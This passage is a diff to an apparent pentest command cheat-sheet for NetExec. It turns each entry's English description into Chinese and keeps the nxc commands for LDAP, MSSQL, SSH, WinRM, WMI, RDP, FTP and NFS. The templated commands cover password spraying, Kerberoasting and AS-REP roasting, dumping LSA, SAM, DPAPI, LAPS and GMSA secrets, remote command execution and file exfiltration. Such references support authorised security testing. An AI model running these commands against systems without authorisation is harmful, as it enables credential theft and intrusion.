     command: "nxc smb {{target}} -u {{username}} -p {{password}} -M laps"
 
   # ============================================================================
   # LDAP PROTOCOL
   # ============================================================================
 
-  - title: nxc ldap - basic authentication
+  - title: nxc ldap - 基础认证
     desc: |
-      Authenticate to LDAP with username and password. Tests LDAP credentials.
-      Shows domain information on success.
+      使用用户名和密码认证 LDAP。测试 LDAP 凭据。成功后显示域信息。
     command: "nxc ldap {{target}} -u {{username}} -p {{password}}"
 
-  - title: nxc ldap - authenticate with hash
+  - title: nxc ldap - 使用哈希认证
     desc: |
-      Authenticate to LDAP using NTLM hash. Pass-the-hash authentication for
-      LDAP protocol.
+      使用 NTLM 哈希认证 LDAP。LDAP 协议的 pass-the-hash 认证。
     command: "nxc ldap {{target}} -u {{username}} -H {{hash|A29F7623FD11550DEF0192DE9246F46B}}"
 
-  - title: nxc ldap - authenticate without SMB
+  - title: nxc ldap - 不使用 SMB 认证
     desc: |
-      Authenticate to LDAP without initial SMB connection. Use --no-smb when
-      SMB port is closed or you want to skip SMB connection.
+      无需初始 SMB 连接即可认证 LDAP。当 SMB 端口关闭或你想跳过 SMB 连接时使用 --no-smb。
     command: "nxc ldap {{target}} -u {{username}} -p {{password}} --no-smb"
 
-  - title: nxc ldap - enumerate users
+  - title: nxc ldap - 枚举用户
     desc: |
-      Enumerate all users in domain via LDAP. Lists all domain users with
-      their attributes. Requires domain credentials.
+      通过 LDAP 枚举域中的所有用户。列出所有域用户及其属性。需要域凭据。
     command: "nxc ldap {{target}} -u {{username}} -p {{password}} --users"
 
-  - title: nxc ldap - enumerate active users
+  - title: nxc ldap - 枚举活动用户
     desc: |
-      Enumerate only active (enabled) users in domain. Filters out disabled
-      accounts. More efficient than full user enumeration.
+      只枚举域中活动（已启用）的用户。过滤掉已禁用账户。比完整用户枚举更高效。
     command: "nxc ldap {{target}} -u {{username}} -p {{password}} --active-users"
 
-  - title: nxc ldap - export users to file
+  - title: nxc ldap - 导出用户到文件
     desc: |
-      Enumerate users and export to file. Saves user list to specified file
-      for further processing or analysis.
+      枚举用户并导出到文件。将用户列表保存到指定文件以供进一步处理或分析。
     command: "nxc ldap {{target}} -u {{username}} -p {{password}} --users-export {{output_file|users.txt}}"
 
-  - title: nxc ldap - enumerate group members
+  - title: nxc ldap - 枚举组成员
     desc: |
-      Enumerate members of specific group. Lists all users in specified domain
-      group. Useful for finding privileged group members.
+      枚举特定组的成员。列出指定域组中的所有用户。用于查找特权组成员。
     command: "nxc ldap {{target}} -u {{username}} -p {{password}} --group-members {{group_name|Domain Admins}}"
 
-  - title: nxc ldap - enumerate trusts
+  - title: nxc ldap - 枚举信任
     desc: |
-      Enumerate domain trusts. Lists all trust relationships with other domains.
-      Useful for cross-domain attack planning.
+      枚举域信任。列出与其他域的所有信任关系。用于跨域攻击规划。
     command: "nxc ldap {{target}} -u {{username}} -p {{password}} --trusts"
 
-  - title: nxc ldap - enumerate domain controllers
+  - title: nxc ldap - 枚举域控
     desc: |
-      Enumerate domain controllers. Lists all DCs in the domain with their
-      IP addresses and hostnames.
+      枚举域控。列出域中所有域控及其 IP 地址和主机名。
     command: "nxc ldap {{target}} -u {{username}} -p {{password}} --dc-list"
 
-  - title: nxc ldap - find domain SID
+  - title: nxc ldap - 查找域 SID
     desc: |
-      Find domain SID (Security Identifier). Retrieves domain SID which is
-      needed for various attacks and enumeration.
+      查找域 SID（安全标识符）。获取各种攻击和枚举所需的域 SID。
     command: "nxc ldap {{target}} -u {{username}} -p {{password}} --domain-sid"
 
-  - title: nxc ldap - ASREPRoast attack
+  - title: nxc ldap - ASREPRoast 攻击
     desc: |
-      Perform ASREPRoast attack. Retrieves AS-REP hashes for users without
-      Kerberos pre-authentication. Can be done without credentials.
+      执行 ASREPRoast 攻击。为无 Kerberos 预认证的用户获取 AS-REP 哈希。无需凭据即可完成。
     command: "nxc ldap {{target}} -u {{username|''}} -p {{password|''}} --asreproast {{output_file|asrep.txt}}"
 
-  - title: nxc ldap - ASREPRoast with user list
+  - title: nxc ldap - 带用户列表的 ASREPRoast
     desc: |
-      ASREPRoast attack with user list. Tests multiple users for AS-REP
-      roastable accounts. No authentication required.
+      带用户列表的 ASREPRoast 攻击。测试多个用户寻找可 AS-REP roast 的账户。无需认证。
     command: "nxc ldap {{target}} -u {{users_file|~/users.txt}} -p '' --asreproast {{output_file|asrep.txt}}"
 
-  - title: nxc ldap - ASREPRoast with authentication
+  - title: nxc ldap - 带认证的 ASREPRoast
     desc: |
-      ASREPRoast attack with valid credentials. Enumerates all users and finds
-      AS-REP roastable accounts. More comprehensive than unauthenticated version.
+      使用有效凭据的 ASREPRoast 攻击。枚举所有用户并寻找可 AS-REP roast 的账户。比未认证版本更全面。
     command: "nxc ldap {{target}} -u {{username}} -p {{password}} --asreproast {{output_file|asrep.txt}}"
 
-  - title: nxc ldap - Kerberoasting attack
+  - title: nxc ldap - Kerberoasting 攻击
     desc: |
-      Perform Kerberoasting attack. Retrieves TGS-REP hashes for service accounts.
-      Requires domain account or AS-REP roastable account.
+      执行 Kerberoasting 攻击。获取服务账户的 TGS-REP 哈希。需要域账户或可 AS-REP roast 的账户。
     command: "nxc ldap {{target}} -u {{username}} -p {{password}} --kerberoasting {{output_file|kerberoast.txt}}"
 
-  - title: nxc ldap - Kerberoasting via AS-REP
+  - title: nxc ldap - 通过 AS-REP 进行 Kerberoasting
     desc: |
-      Kerberoasting using AS-REP roastable account. Combines --no-preauth-targets
-      and --kerberoasting to perform Kerberoasting without pre-authentication.
+      使用可 AS-REP roast 的账户进行 Kerberoasting。结合 --no-preauth-targets 和 --kerberoasting 在无预认证的情况下执行 Kerberoasting。
     command: "nxc ldap {{target}} -u {{asrep_user}} -p '' --no-preauth-targets {{targets_file|kerberoastable.list}} --kerberoasting {{output_file|kerberoast.txt}}"
 
-  - title: nxc ldap - check LDAP signing
+  - title: nxc ldap - 检查 LDAP 签名
     desc: |
-      Check if LDAP signing is required. Unsigned LDAP allows for relay attacks.
-      Shows signing status for domain controllers.
+      检查是否需要 LDAP 签名。未签名的 LDAP 允许中继攻击。显示域控的签名状态。
     command: "nxc ldap {{target}} -u {{username}} -p {{password}} --ldap-signing"
 
-  - title: nxc ldap - find unconstrained delegation
+  - title: nxc ldap - 查找非约束委派
     desc: |
-      Find accounts with unconstrained delegation. These accounts can be abused
-      for privilege escalation and credential theft.
+      查找具有非约束委派的账户。这些账户可被滥用于权限提升和凭据窃取。
     command: "nxc ldap {{target}} -u {{username}} -p {{password}} --unconstrained-delegation"
 
-  - title: nxc ldap - find misconfigured delegation
+  - title: nxc ldap - 查找配置错误的委派
     desc: |
-      Find accounts with misconfigured constrained delegation. Constrained
-      delegation misconfigurations can be exploited for privilege escalation.
+      查找约束委派配置错误的账户。约束委派错误配置可被利用进行权限提升。
     command: "nxc ldap {{target}} -u {{username}} -p {{password}} --find-delegation"
 
-  - title: nxc ldap - enumerate admin count
+  - title: nxc ldap - 枚举 admin count
     desc: |
-      Enumerate users with adminCount=1. These users have privileged access
-      and are high-value targets.
+      枚举 adminCount=1 的用户。这些用户具有特权访问，是高价值目标。
     command: "nxc ldap {{target}} -u {{username}} -p {{password}} --admin-count"
 
-  - title: nxc ldap - dump GMSA accounts
+  - title: nxc ldap - 转储 GMSA 账户
     desc: |
-      Dump Group Managed Service Account (GMSA) information. GMSA accounts
-      have managed passwords that can be extracted.
+      转储组托管服务账户（GMSA）信息。GMSA 账户有可被提取的托管密码。
     command: "nxc ldap {{target}} -u {{username}} -p {{password}} --gmsa"
 
-  - title: nxc ldap - extract GMSA secrets
+  - title: nxc ldap - 提取 GMSA 机密
     desc: |
-      Extract GMSA account secrets. Retrieves password hashes for GMSA accounts
-      that can be used for authentication.
+      提取 GMSA 账户机密。获取可用于认证的 GMSA 账户密码哈希。
     command: "nxc ldap {{target}} -u {{username}} -p {{password}} --gmsa-secrets"
 
-  - title: nxc ldap - enumerate machine account quota
+  - title: nxc ldap - 枚举机器账户配额
     desc: |
-      Check machine account quota. Shows how many computer accounts a user can
-      create. Useful for domain persistence.
+      检查机器账户配额。显示用户可以创建多少个计算机账户。用于域持久化。
     command: "nxc ldap {{target}} -u {{username}} -p {{password}} --maq"
 
-  - title: nxc ldap - read DACL rights
+  - title: nxc ldap - 读取 DACL 权限
     desc: |
-      Read DACL (Discretionary Access Control List) rights. Shows permissions
-      on objects that might allow privilege escalation.
+      读取 DACL（自主访问控制列表）权限。显示对象上可能允许权限提升的权限。
     command: "nxc ldap {{target}} -u {{username}} -p {{password}} --dacl"
 
-  - title: nxc ldap - get user descriptions
+  - title: nxc ldap - 获取用户描述
     desc: |
-      Get user descriptions from LDAP. User descriptions sometimes contain
-      passwords or other sensitive information.
+      从 LDAP 获取用户描述。用户描述有时包含密码或其他敏感信息。
     command: "nxc ldap {{target}} -u {{username}} -p {{password}} --user-descriptions"
 
-  - title: nxc ldap - extract subnet information
+  - title: nxc ldap - 提取子网信息
     desc: |
-      Extract subnet information from AD. Lists all subnets defined in
-      Active Directory Sites and Services.
+      从 AD 提取子网信息。列出 Active Directory 站点和服务中定义的所有子网。
     command: "nxc ldap {{target}} -u {{username}} -p {{password}} --subnets"
 
-  - title: nxc ldap - enumerate SCCM
+  - title: nxc ldap - 枚举 SCCM
     desc: |
-      Enumerate SCCM (System Center Configuration Manager) information.
-      SCCM can be abused for lateral movement and code execution.
+      枚举 SCCM（System Center Configuration Manager）信息。SCCM 可被滥用于横向移动和代码执行。
     command: "nxc ldap {{target}} -u {{username}} -p {{password}} --sccm"
 
-  - title: nxc ldap - enumerate Entra ID
+  - title: nxc ldap - 枚举 Entra ID
     desc: |
-      Enumerate Entra ID (Azure AD) information. Shows Entra ID configuration
-      and hybrid setup information.
+      枚举 Entra ID（Azure AD）信息。显示 Entra ID 配置和混合设置信息。
     command: "nxc ldap {{target}} -u {{username}} -p {{password}} --entra-id"
 
-  - title: nxc ldap - query LDAP
+  - title: nxc ldap - 查询 LDAP
     desc: |
-      Execute custom LDAP query. Allows running arbitrary LDAP queries for
-      advanced enumeration and data extraction.
+      执行自定义 LDAP 查询。允许运行任意 LDAP 查询进行高级枚举和数据提取。
     command: "nxc ldap {{target}} -u {{username}} -p {{password}} --query {{ldap_query|(objectClass=user)}}"
 
-  - title: nxc ldap - BloodHound ingestor
+  - title: nxc ldap - BloodHound 采集器
     desc: |
-      Run BloodHound ingestor to collect AD data. Generates BloodHound-compatible
-      data files for graph analysis.
+      运行 BloodHound 采集器收集 AD 数据。生成与 BloodHound 兼容的数据文件用于图分析。
     command: "nxc ldap {{target}} -u {{username}} -p {{password}} --bloodhound"
 
-  - title: nxc ldap - exploit ESC8 (ADCS)
+  - title: nxc ldap - 利用 ESC8（ADCS）
     desc: |
-      Exploit ESC8 vulnerability in Active Directory Certificate Services.
-      Allows for domain escalation through certificate abuse.
+      利用 Active Directory 证书服务中的 ESC8 漏洞。允许通过证书滥用进行域权限提升。
     command: "nxc ldap {{target}} -u {{username}} -p {{password}} --esc8"
 
-  - title: nxc ldap - raise child domain
+  - title: nxc ldap - 提升子域
     desc: |
-      Raise functional level of child domain. Advanced domain manipulation
-      requiring Domain Admin privileges.
+      提升子域的功能级别。需要域管理员权限的高级域操作。
     command: "nxc ldap {{target}} -u {{username}} -p {{password}} --raise-child"
 
   # ============================================================================
   # MSSQL PROTOCOL
   # ============================================================================
 
-  - title: nxc mssql - authenticate Windows auth
+  - title: nxc mssql - Windows 认证
     desc: |
-      Authenticate to MSSQL using Windows authentication. Default authentication
-      method. Uses current user's Windows credentials or specified domain account.
+      使用 Windows 认证认证 MSSQL。默认认证方法。使用当前用户的 Windows 凭据或指定的域账户。
     command: "nxc mssql {{target}} -u {{username}} -p {{password}}"
 
-  - title: nxc mssql - authenticate Windows auth with domain
+  - title: nxc mssql - 带域的 Windows 认证
     desc: |
-      Authenticate to MSSQL with Windows auth when SMB port is closed. Specify
-      domain explicitly with -d flag to avoid SMB connection.
+      当 SMB 端口关闭时使用 Windows 认证认证 MSSQL。用 -d 标志显式指定域以避免 SMB 连接。
     command: "nxc mssql {{target}} -u {{username}} -p {{password}} -d {{domain|DOMAIN}}"
 
-  - title: nxc mssql - authenticate local auth
+  - title: nxc mssql - 本地认证
     desc: |
-      Authenticate to MSSQL using SQL Server authentication (local auth).
-      Use --local-auth flag for SQL login instead of Windows login.
+      使用 SQL Server 认证（本地认证）认证 MSSQL。使用 --local-auth 标志进行 SQL 登录而非 Windows 登录。
     command: "nxc mssql {{target}} -u {{username}} -p {{password}} --local-auth"
 
-  - title: nxc mssql - specify custom port
+  - title: nxc mssql - 指定自定义端口
     desc: |
-      Connect to MSSQL on custom port. Default is 1433. Use --port for
-      non-standard ports.
+      在自定义端口上连接 MSSQL。默认为 1433。非标准端口使用 --port。
     command: "nxc mssql {{target}} -u {{username}} -p {{password}} --port {{port|1434}}"
 
-  - title: nxc mssql - execute SQL query
+  - title: nxc mssql - 执行 SQL 查询
     desc: |
-      Execute SQL query on MSSQL server. Runs specified SQL command and
-      displays results. Requires appropriate database permissions.
+      在 MSSQL 服务器上执行 SQL 查询。运行指定的 SQL 命令并显示结果。需要适当的数据库权限。
     command: "nxc mssql {{target}} -u {{username}} -p {{password}} -q '{{sql_query|SELECT name FROM master.dbo.sysdatabases;}}'"
 
-  - title: nxc mssql - execute Windows command
+  - title: nxc mssql - 执行 Windows 命令
     desc: |
-      Execute Windows command via MSSQL xp_cmdshell. Requires xp_cmdshell to be
-      enabled and appropriate privileges. Shows (Pwn3d!) on success.
+      通过 MSSQL xp_cmdshell 执行 Windows 命令。需要启用 xp_cmdshell 并有适当权限。成功后显示（Pwn3d!）。
     command: "nxc mssql {{target}} -u {{username}} -p {{password}} -x {{command|whoami}}"
 
-  - title: nxc mssql - password spray
+  - title: nxc mssql - 密码喷洒
     desc: |
-      Password spray against MSSQL servers. Tests credentials against multiple
-      MSSQL instances. Use --no-bruteforce for 1:1 user:password mapping.
+      对 MSSQL 服务器进行密码喷洒。对多个 MSSQL 实例测试凭据。使用 --no-bruteforce 进行 1:1 用户:密码映射。
     command: "nxc mssql {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"
 
-  - title: nxc mssql - enumerate users by RID
+  - title: nxc mssql - 通过 RID 枚举用户
     desc: |
-      Enumerate users by brute forcing RIDs. Attempts to resolve SIDs to usernames
-      by trying different RID values. Useful for user enumeration.
+      通过暴力破解 RID 枚举用户。通过尝试不同的 RID 值将 SID 解析为用户名。用于用户枚举。
     command: "nxc mssql {{target}} -u {{username}} -p {{password}} --rid-brute"
 
-  - title: nxc mssql - privilege escalation
+  - title: nxc mssql - 权限提升
     desc: |
-      Attempt MSSQL privilege escalation. Tries to escalate privileges through
-      various MSSQL misconfigurations and vulnerabilities.
+      尝试 MSSQL 权限提升。通过各种 MSSQL 错误配置和漏洞尝试提升权限。
     command: "nxc mssql {{target}} -u {{username}} -p {{password}} --privesc"
 
-  - title: nxc mssql - upload file
+  - title: nxc mssql - 上传文件
     desc: |
-      Upload file to MSSQL server. Transfers local file to remote system via
-      MSSQL. Useful for transferring tools or payloads.
+      将文件上传到 MSSQL 服务器。通过 MSSQL 将本地文件传输到远程系统。用于传输工具或 payload。
     command: "nxc mssql {{target}} -u {{username}} -p {{password}} --put-file {{local_file|/tmp/file.txt}} {{remote_path|C:\\temp\\file.txt}}"
 
-  - title: nxc mssql - download file
+  - title: nxc mssql - 下载文件
     desc: |
-      Download file from MSSQL server. Retrieves remote file via MSSQL to
-      local system. Useful for data exfiltration.
+      从 MSSQL 服务器下载文件。通过 MSSQL 将远程文件获取到本地系统。用于数据窃取。
     command: "nxc mssql {{target}} -u {{username}} -p {{password}} --get-file {{remote_path|C:\\temp\\file.txt}} {{local_file|/tmp/file.txt}}"
 
   # ============================================================================
   # SSH PROTOCOL
   # ============================================================================
 
-  - title: nxc ssh - basic authentication
+  - title: nxc ssh - 基础认证
     desc: |
-      Authenticate to SSH server with username and password. Tests SSH credentials.
-      Shows SSH version and authentication result.
+      使用用户名和密码认证 SSH 服务器。测试 SSH 凭据。显示 SSH 版本和认证结果。
     command: "nxc ssh {{target}} -u {{username}} -p {{password}}"
 
-  - title: nxc ssh - specify custom port
+  - title: nxc ssh - 指定自定义端口
     desc: |
-      Connect to SSH on custom port. Default is 22. Use --port for non-standard
-      SSH ports.
+      在自定义端口上连接 SSH。默认为 22。非标准 SSH 端口使用 --port。
     command: "nxc ssh {{target}} --port {{port|2222}}"
 
-  - title: nxc ssh - execute command
+  - title: nxc ssh - 执行命令
     desc: |
-      Execute command on remote system via SSH. Runs command and displays output.
-      Shows (Pwn3d!) when root access is obtained.
+      通过 SSH 在远程系统上执行命令。运行命令并显示输出。获得 root 访问时显示（Pwn3d!）。
     command: "nxc ssh {{target}} -u {{username}} -p {{password}} -x {{command|whoami}}"
 
-  - title: nxc ssh - password spray
+  - title: nxc ssh - 密码喷洒
     desc: |
-      Password spray against SSH servers. Tests credentials against multiple
-      SSH hosts. Watch for account lockouts!
+      对 SSH 服务器进行密码喷洒。对多个 SSH 主机测试凭据。注意账户锁定！
     command: "nxc ssh {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"
 
-  - title: nxc ssh - get file from remote
+  - title: nxc ssh - 从远程获取文件
     desc: |
-      Download file from remote system via SCP. Transfers file from remote
-      to local system using SSH/SCP.
+      通过 SCP 从远程系统下载文件。使用 SSH/SCP 将文件从远程传输到本地系统。
     command: "nxc ssh {{target}} -u {{username}} -p {{password}} --get-file {{remote_path|/tmp/file.txt}} {{local_path|/tmp/file.txt}}"
 
-  - title: nxc ssh - put file to remote
+  - title: nxc ssh - 上传文件到远程
     desc: |
-      Upload file to remote system via SCP. Transfers local file to remote
-      system using SSH/SCP.
+      通过 SCP 将文件上传到远程系统。使用 SSH/SCP 将本地文件传输到远程系统。
     command: "nxc ssh {{target}} -u {{username}} -p {{password}} --put-file {{local_path|/tmp/file.txt}} {{remote_path|/tmp/file.txt}}"
 
   # ============================================================================
   # WinRM PROTOCOL
   # ============================================================================
 
-  - title: nxc winrm - basic authentication
+  - title: nxc winrm - 基础认证
     desc: |
-      Authenticate to WinRM service with username and password. Tests WinRM
-      credentials. Shows (Pwn3d!) when code execution is possible.
+      使用用户名和密码认证 WinRM 服务。测试 WinRM 凭据。可执行代码时显示（Pwn3d!）。
     command: "nxc winrm {{target}} -u {{username}} -p {{password}}"
 
-  - title: nxc winrm - authenticate with domain
+  - title: nxc winrm - 带域认证
     desc: |
-      Authenticate to WinRM with domain when SMB port is closed. Use -d flag
-      to specify domain and avoid SMB connection.
+      当 SMB 端口关闭时带域认证 WinRM。使用 -d 标志指定域并避免 SMB 连接。
     command: "nxc winrm {{target}} -u {{username}} -p {{password}} -d {{domain|DOMAIN}}"
 
-  - title: nxc winrm - execute command
+  - title: nxc winrm - 执行命令
     desc: |
-      Execute command on remote system via WinRM. Runs PowerShell command and
-      displays output. Shows (Pwn3d!) on success.
+      通过 WinRM 在远程系统上执行命令。运行 PowerShell 命令并显示输出。成功后显示（Pwn3d!）。
     command: "nxc winrm {{target}} -u {{username}} -p {{password}} -X {{command|whoami}}"
 
-  - title: nxc winrm - password spray
+  - title: nxc winrm - 密码喷洒
     desc: |
-      Password spray against WinRM services. Tests credentials against multiple
-      WinRM hosts. Use --no-bruteforce for 1:1 user:password mapping.
+      对 WinRM 服务进行密码喷洒。对多个 WinRM 主机测试凭据。使用 --no-bruteforce 进行 1:1 用户:密码映射。
     command: "nxc winrm {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"
 
-  - title: nxc winrm - dump LSA secrets
+  - title: nxc winrm - 转储 LSA 机密
     desc: |
-      Dump LSA secrets from remote system via WinRM. Extracts cached credentials
-      and service account passwords. Requires admin privileges.
+      通过 WinRM 从远程系统转储 LSA 机密。提取缓存的凭据和服务账户密码。需要管理员权限。
     command: "nxc winrm {{target}} -u {{username}} -p {{password}} -M lsassy"
 
-  - title: nxc winrm - dump SAM database
+  - title: nxc winrm - 转储 SAM 数据库
     desc: |
-      Dump SAM database from remote system via WinRM. Extracts local account
-      password hashes. Requires SYSTEM privileges.
+      通过 WinRM 从远程系统转储 SAM 数据库。提取本地账户密码哈希。需要 SYSTEM 权限。
     command: "nxc winrm {{target}} -u {{username}} -p {{password}} -M sam"
 
-  - title: nxc winrm - dump DPAPI secrets
+  - title: nxc winrm - 转储 DPAPI 机密
     desc: |
-      Dump DPAPI secrets from remote system via WinRM. Extracts encrypted
-      credentials stored by Windows applications.
+      通过 WinRM 从远程系统转储 DPAPI 机密。提取 Windows 应用存储的加密凭据。
     command: "nxc winrm {{target}} -u {{username}} -p {{password}} -M dpapi"
 
-  - title: nxc winrm - defeat LAPS
+  - title: nxc winrm - 突破 LAPS
     desc: |
-      Extract LAPS passwords via WinRM. Retrieves managed local admin passwords
-      from domain through WinRM.
+      通过 WinRM 提取 LAPS 密码。通过 WinRM 从域中获取托管的本地管理员密码。
     command: "nxc winrm {{target}} -u {{username}} -p {{password}} -M laps"
 
   # ============================================================================
   # WMI PROTOCOL
   # ============================================================================
 
-  - title: nxc wmi - authenticate Windows auth
+  - title: nxc wmi - Windows 认证
     desc: |
-      Authenticate to WMI using Windows authentication. Default authentication
-      method. Uses Windows credentials for WMI access.
+      使用 Windows 认证认证 WMI。默认认证方法。使用 Windows 凭据进行 WMI 访问。
     command: "nxc wmi {{target}} -u {{username}} -p {{password}}"
 
-  - title: nxc wmi - authenticate Windows auth with domain
+  - title: nxc wmi - 带域的 Windows 认证
     desc: |
-      Authenticate to WMI with Windows auth when SMB port is closed. Specify
-      domain with -d flag to avoid SMB connection.
+      当 SMB 端口关闭时使用 Windows 认证认证 WMI。用 -d 标志指定域以避免 SMB 连接。
     command: "nxc wmi {{target}} -u {{username}} -p {{password}} -d {{domain|DOMAIN}}"
 
-  - title: nxc wmi - authenticate local auth
+  - title: nxc wmi - 本地认证
     desc: |
-      Authenticate to WMI using local authentication. Use --local-auth flag
-      for local account instead of domain account.
+      使用本地认证认证 WMI。使用 --local-auth 标志使用本地账户而非域账户。
     command: "nxc wmi {{target}} -u {{username}} -p {{password}} --local-auth"
 
-  - title: nxc wmi - execute command
+  - title: nxc wmi - 执行命令
     desc: |
-      Execute command on remote system via WMI. Runs command through WMI
-      and displays output. Shows (Pwn3d!) when local admin access is obtained.
+      通过 WMI 在远程系统上执行命令。通过 WMI 运行命令并显示输出。获得本地管理员访问时显示（Pwn3d!）。
     command: "nxc wmi {{target}} -u {{username}} -p {{password}} -x {{command|whoami}}"
 
-  - title: nxc wmi - password spray
+  - title: nxc wmi - 密码喷洒
     desc: |
-      Password spray against WMI services. Tests credentials against multiple
-      WMI hosts. Use --no-bruteforce for 1:1 user:password mapping.
+      对 WMI 服务进行密码喷洒。对多个 WMI 主机测试凭据。使用 --no-bruteforce 进行 1:1 用户:密码映射。
     command: "nxc wmi {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"
 
   # ============================================================================
   # RDP PROTOCOL
   # ============================================================================
 
-  - title: nxc rdp - basic authentication
+  - title: nxc rdp - 基础认证
     desc: |
-      Authenticate to RDP service with username and password. Tests RDP
-      credentials. Shows (Pwn3d!) when code execution is possible.
+      使用用户名和密码认证 RDP 服务。测试 RDP 凭据。可执行代码时显示（Pwn3d!）。
     command: "nxc rdp {{target}} -u {{username}} -p {{password}}"
 
-  - title: nxc rdp - password spray
+  - title: nxc rdp - 密码喷洒
     desc: |
-      Password spray against RDP services. Tests credentials against multiple
-      RDP hosts. Watch for account lockouts!
+      对 RDP 服务进行密码喷洒。对多个 RDP 主机测试凭据。注意账户锁定！
     command: "nxc rdp {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"
 
-  - title: nxc rdp - password spray without bruteforce
+  - title: nxc rdp - 不暴力破解的密码喷洒
     desc: |
-      Password spray with 1:1 user:password mapping. Each user gets matched
-      with corresponding password from file. user1=>pass1, user2=>pass2.
+      1:1 用户:密码映射的密码喷洒。每个用户与文件中对应的密码匹配。user1=>pass1、user2=>pass2。
     command: "nxc rdp {{target}} -u {{users_file|~/users.txt}} -p {{passwords_file|~/passwords.txt}} --no-bruteforce"
 
-  - title: nxc rdp - execute command
+  - title: nxc rdp - 执行命令
     desc: |
-      Execute command on remote system via RDP. Runs command through RDP
-      session. Shows (Pwn3d!) on success.
+      通过 RDP 在远程系统上执行命令。通过 RDP 会话运行命令。成功后显示（Pwn3d!）。
     command: "nxc rdp {{target}} -u {{username}} -p {{password}} -x {{command|whoami}}"
 
-  - title: nxc rdp - take screenshot (connected)
+  - title: nxc rdp - 截屏（已连接）
     desc: |
-      Take screenshot of RDP session when connected. Captures screen of active
-      RDP session. Useful for reconnaissance.
+      连接时对 RDP 会话截屏。捕获活动 RDP 会话的屏幕。用于侦察。
     command: "nxc rdp {{target}} -u {{username}} -p {{password}} --screenshot"
 
-  - title: nxc rdp - take screenshot (without NLA, not connected)
+  - title: nxc rdp - 截屏（无 NLA、未连接）
     desc: |
-      Take screenshot without NLA when not connected. Attempts to capture
-      login screen on RDP servers with NLA disabled.
+      未连接时在无 NLA 的情况下截屏。尝试在禁用 NLA 的 RDP 服务器上捕获登录屏幕。
     command: "nxc rdp {{target}} --screenshot-no-nla"
 
   # ============================================================================
   # FTP PROTOCOL
   # ============================================================================
 
-  - title: nxc ftp - basic authentication
+  - title: nxc ftp - 基础认证
     desc: |
-      Authenticate to FTP server with username and password. Tests FTP
-      credentials. No (Pwn3d!) check for FTP protocol.
+      使用用户名和密码认证 FTP 服务器。测试 FTP 凭据。FTP 协议无（Pwn3d!）检查。
     command: "nxc ftp {{target}} -u {{username}} -p {{password}}"
 
-  - title: nxc ftp - password spray
+  - title: nxc ftp - 密码喷洒
     desc: |
-      Password spray against FTP servers. Tests credentials against multiple
-      FTP hosts. Use --no-bruteforce for 1:1 user:password mapping.
+      对 FTP 服务器进行密码喷洒。对多个 FTP 主机测试凭据。使用 --no-bruteforce 进行 1:1 用户:密码映射。
     command: "nxc ftp {{target}} -u {{users_file|~/users.txt}} -p {{passwords_file|~/passwords.txt}} --no-bruteforce"
 
-  - title: nxc ftp - password spray with continue on success
+  - title: nxc ftp - 成功后继续的密码喷洒
     desc: |
-      Password spray continuing after successful login. Useful for spraying
-      single password against large user list.
+      成功登录后继续密码喷洒。适用于对大型用户列表喷洒单个密码。
     command: "nxc ftp {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}} --continue-on-success"
 
-  - title: nxc ftp - list files
+  - title: nxc ftp - 列出文件
     desc: |
-      List files on FTP server. Enumerates files and directories in FTP
-      share. Useful for reconnaissance.
+      列出 FTP 服务器上的文件。枚举 FTP 共享中的文件和目录。用于侦察。
     command: "nxc ftp {{target}} -u {{username}} -p {{password}} --list"
 
-  - title: nxc ftp - get file from remote
+  - title: nxc ftp - 从远程获取文件
     desc: |
-      Download file from FTP server. Transfers file from remote to local
-      system via FTP.
+      从 FTP 服务器下载文件。通过 FTP 将文件从远程传输到本地系统。
     command: "nxc ftp {{target}} -u {{username}} -p {{password}} --get-file {{remote_path|/file.txt}} {{local_path|/tmp/file.txt}}"
 
-  - title: nxc ftp - put file to remote
+  - title: nxc ftp - 上传文件到远程
     desc: |
-      Upload file to FTP server. Transfers local file to remote system via FTP.
+      将文件上传到 FTP 服务器。通过 FTP 将本地文件传输到远程系统。
     command: "nxc ftp {{target}} -u {{username}} -p {{password}} --put-file {{local_path|/tmp/file.txt}} {{remote_path|/file.txt}}"
 
   # ============================================================================
   # NFS PROTOCOL
   # ============================================================================
 
-  - title: nxc nfs - enumerate NFS server
+  - title: nxc nfs - 枚举 NFS 服务器
     desc: |
-      Enumerate NFS server information. Detects supported NFS versions and
-      checks for root escape vulnerability.
+      枚举 NFS 服务器信息。检测支持的 NFS 版本并检查 root 逃逸漏洞。
     command: "nxc nfs {{target}}"
 
-  - title: nxc nfs - enumerate shares
+  - title: nxc nfs - 枚举共享
     desc: |
-      Enumerate exported NFS shares. Lists all available NFS shares with
-      permissions, storage usage, and access lists.
+      枚举导出的 NFS 共享。列出所有可用的 NFS 共享及其权限、存储使用情况和访问列表。
     command: "nxc nfs {{target}} --shares"
 
-  - title: nxc nfs - list files on share
+  - title: nxc nfs - 列出共享上的文件
     desc: |
-      List files on specific NFS share. Shows files and directories in
-      specified share path.
+      列出特定 NFS 共享上的文件。显示指定共享路径中的文件和目录。
     command: "nxc nfs {{target}} --share {{share_path|/var/nfs/general}} --ls {{path|/}}"
 
-  - title: nxc nfs - enumerate shares recursively
+  - title: nxc nfs - 递归枚举共享
     desc: |
-      Enumerate all files recursively on NFS shares. Recursively discovers
-      files and folders with specified depth (default 3).
+      递归枚举 NFS 共享上的所有文件。按指定深度（默认 3）递归发现文件和文件夹。
     command: "nxc nfs {{target}} --enum-shares"
 
-  - title: nxc nfs - enumerate with custom depth
+  - title: nxc nfs - 使用自定义深度枚举
     desc: |
-      Enumerate shares with custom recursion depth. Specify depth for
-      recursive enumeration (default is 3 layers).
+      使用自定义递归深度枚举共享。指定递归枚举的深度（默认为 3 层）。
     command: "nxc nfs {{target}} --enum-shares {{depth|5}}"
 
-  - title: nxc nfs - download file
+  - title: nxc nfs - 下载文件
     desc: |
-      Download file from NFS share. Transfers file from remote NFS share
-      to local system.
+      从 NFS 共享下载文件。将文件从远程 NFS 共享传输到本地系统。
     command: "nxc nfs {{target}} --share {{share_path|/var/nfs/general}} --get-file {{remote_path|/file.txt}} {{local_path|/tmp/file.txt}}"
 
-  - title: nxc nfs - upload file
+  - title: nxc nfs - 上传文件
     desc: |
-      Upload file to NFS share. Transfers local file to remote NFS share.
+      将文件上传到 NFS 共享。将本地文件传输到远程 NFS 共享。
